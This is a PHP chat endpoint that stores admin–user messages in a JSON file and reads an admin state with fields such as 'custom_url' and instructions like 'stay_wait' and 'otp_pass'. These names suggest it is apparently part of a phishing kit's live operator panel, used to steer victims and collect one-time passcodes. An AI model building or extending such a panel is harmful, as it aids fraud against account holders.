<?php
session_start();

$stateFile = __DIR__ . '/admin_state.json';
$chatFile = __DIR__ . '/chat_log.json';

header('Content-Type: application/json');

function loadState($file)
{
    $defaults = [
        'mode' => 'default',
        'custom_url' => '',
        'instruction' => 'stay_wait',
        'instruction_token' => time(),
        'chat_enabled' => false
    ];

    if (!file_exists($file)) {
        return $defaults;
    }

    $data = json_decode(file_get_contents($file), true);
    $state = is_array($data) ? array_merge($defaults, $data) : $defaults;

    if (isset($state['mode']) && $state['mode'] === 'otp_pass') {
        $state['mode'] = 'default';
        $state['instruction'] = $state['instruction'] ?? 'otp_pass';
    }

    if (empty($state['instruction_token'])) {
        $state['instruction_token'] = time();
    }

    return $state;
}

function loadChat($file)
{
    if (!file_exists($file)) {
        return [];
    }

    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

function saveChat($file, $messages)
{
    file_put_contents($file, json_encode($messages, JSON_PRETTY_PRINT));
}

$action = $_GET['action'] ?? 'fetch';
$state = loadState($stateFile);
$chatEnabled = !empty($state['chat_enabled']);

if ($action === 'send') {
    $sender = $_POST['sender'] ?? '';
    $message = trim($_POST['message'] ?? '');

    if ($sender === 'admin' && empty($_SESSION['is_admin'])) {
        http_response_code(403);
        echo json_encode(['error' => 'Not authorized.']);
        exit;
    }

    if (!$chatEnabled) {
        http_response_code(400);
        echo json_encode(['error' => 'Chat is currently disabled by admin.']);
        exit;
    }

    if ($message === '') {
        http_response_code(422);
        echo json_encode(['error' => 'Message cannot be empty.']);
        exit;
    }

    $messages = loadChat($chatFile);
    $messages[] = [
        'sender' => $sender === 'admin' ? 'admin' : 'user',
        'message' => $message,
        'timestamp' => time()
    ];

    saveChat($chatFile, $messages);

    echo json_encode(['success' => true]);
    exit;
}

$messages = loadChat($chatFile);

$formatted = array_map(function ($entry) {
    $entry['formatted'] = date('Y-m-d H:i:s', $entry['timestamp']);
    return $entry;
}, $messages);

header('Content-Type: application/json');

echo json_encode([
    'chat_enabled' => $chatEnabled,
    'messages' => $formatted,
]);
